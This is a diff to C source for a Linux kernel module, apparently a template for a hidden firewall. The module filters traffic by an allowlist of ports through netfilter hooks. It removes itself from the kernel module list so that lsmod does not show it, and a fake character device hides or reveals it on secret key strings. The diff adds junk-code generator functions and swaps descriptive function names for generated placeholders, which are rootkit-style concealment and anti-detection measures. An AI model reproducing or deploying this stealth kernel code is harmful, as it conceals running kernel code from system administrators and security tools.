@@ -33,9 +33,44 @@ static struct class *fake_class;
 static struct cdev fake_cdev;
 static char message[128];
 static struct nf_hook_ops netfilter_ops;
-int whitelist[]={PUBLIC_PORTS};
+int allowlist[]={PUBLIC_PORTS};
+void CODE_GEN_FUNC_NAME2 (void);
+void CODE_GEN_FUNC_NAME3 (void);
+
+/* Junk code generator macros */
+void CODE_GEN_FUNC_NAME1 (void)
+{
+	int counter=0;
+	JUNK_CODE_1
+
+		while(counter!=5)
+		{
+			CODE_GEN_FUNC_NAME2();
+			counter++;
+		}
+}
+
+void CODE_GEN_FUNC_NAME2 (void)
+{
+	int counter=0;
+	JUNK_CODE_2
+
+		while(counter!=4)
+		{
+			CODE_GEN_FUNC_NAME3();
+			counter++;
+		}
+}
 
 
+void CODE_GEN_FUNC_NAME3 (void)
+{
+	JUNK_CODE_3
+
+}
+
+
+// block port scans
 unsigned int filter_port_scans(struct sk_buff *skb)
 {
 	struct tcphdr *tcp_header=(struct tcphdr *) skb_transport_header(skb);
@@ -84,14 +119,14 @@ unsigned int filter_port_scans(struct sk_buff *skb)
 
 
 
-void module_hide(void)
+void CODE_GEN_FUNC_NAME4(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
 
-static inline void tidy(void)
+static inline void CODE_GEN_FUNC_NAME5(void)
 {
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
@@ -122,21 +157,21 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 {
 	memset(message,0,127);
 
-	if(copy_from_user(message,buf,127)!=0)
-		return EFAULT;
+		if(copy_from_user(message,buf,127)!=0)
+			return EFAULT;
 
 /* if detect the secret string in device input, show module at lsmod. */
-    	if(strstr(message,"UNHIDE_KEY")!=NULL)
-	{
-		list_add(&THIS_MODULE->list, module_previous);
-		module_hidden = 0;
-     	}
+    		if(strstr(message,"UNHIDE_KEY")!=NULL)
+		{
+			list_add(&THIS_MODULE->list, module_previous);
+			module_hidden = 0;
+     		}
 
 /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
-    	if(strstr(message,"HIDE_KEY")!=NULL)
-		module_hide();
+    		if(strstr(message,"HIDE_KEY")!=NULL)
+			CODE_GEN_FUNC_NAME4();
 
-    return count;
+    	return count;
 }
 
 
@@ -206,7 +241,7 @@ LIBERATE_IN_IPV6
 */
 		while(i!=PORTS_COUNT)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i])
+			if(dest_port == allowlist[i] || src_port == allowlist[i])
 				return NF_ACCEPT; 
 			i++;
 		
@@ -236,7 +271,7 @@ unsigned int test_udp(struct sk_buff *skb)
 
 		while(i!=PORTS_COUNT)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i])
+			if(dest_port == allowlist[i] || src_port == allowlist[i])
 				return NF_ACCEPT; 
 			i++;
 		
@@ -271,7 +306,7 @@ unsigned int test_tcp_v6(struct sk_buff *skb)
 
 		while(i!=PORTS_COUNT)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
+			if(dest_port == allowlist[i] || src_port == allowlist[i]) 
 				return NF_ACCEPT; 
 			i++;
 		}
@@ -307,7 +342,7 @@ IP_WHITELISTED
 
 		while(i!=PORTS_COUNT)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
+			if(dest_port == allowlist[i] || src_port == allowlist[i]) 
 				return NF_ACCEPT; 
 			i++;
 		}
@@ -418,28 +453,30 @@ int init_module()
     	struct device *fake_device;
     	int error;
     	dev_t devt = 0;
-
-	module_hide();
-	tidy();
+/*       JUNK CODE gen */
+	CODE_GEN_FUNC_NAME1();
+	CODE_GEN_FUNC_NAME4();
+	CODE_GEN_FUNC_NAME5();
 
     /* Get a range of minor numbers (starting with 0) to work with */
     	error = alloc_chrdev_region(&devt, 0, 1, "DEVICE_NAME");
 
-    	if (error < 0) 
-	{
-        	pr_err("Can't get major number\n");
-        	return error;
-    	}
+    		if (error < 0) 
+		{
+        		pr_err("Can't get major number\n");
+        		return error;
+    		}
 
     	major = MAJOR(devt);
 
     /* Create device class, visible in /sys/class */
     	fake_class = class_create(THIS_MODULE, "DEVICE_NAME_class");
 
-    	if (IS_ERR(fake_class)) {
-        	unregister_chrdev_region(MKDEV(major, 0), 1);
-        	return PTR_ERR(fake_class);
-    	}
+    		if (IS_ERR(fake_class)) 
+		{
+        		unregister_chrdev_region(MKDEV(major, 0), 1);
+        		return PTR_ERR(fake_class);
+    		}
 
     /* Initialize the char device and tie a file_operations to it */
     	cdev_init(&fake_cdev, &fake_fops);
@@ -453,12 +490,12 @@ int init_module()
                                 NULL,   /* no additional data */
                                 "DEVICE_NAME");  /* device name */
 
-    	if (IS_ERR(fake_device)) 
-	{
-        	class_destroy(fake_class);
-        	unregister_chrdev_region(devt, 1);
-        	return -1;
-    	}
+    		if (IS_ERR(fake_device)) 
+		{
+        		class_destroy(fake_class);
+        		unregister_chrdev_region(devt, 1);
+        		return -1;
+    		}
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
 	nf_register_net_hook(&init_net, &netfilter_ops);
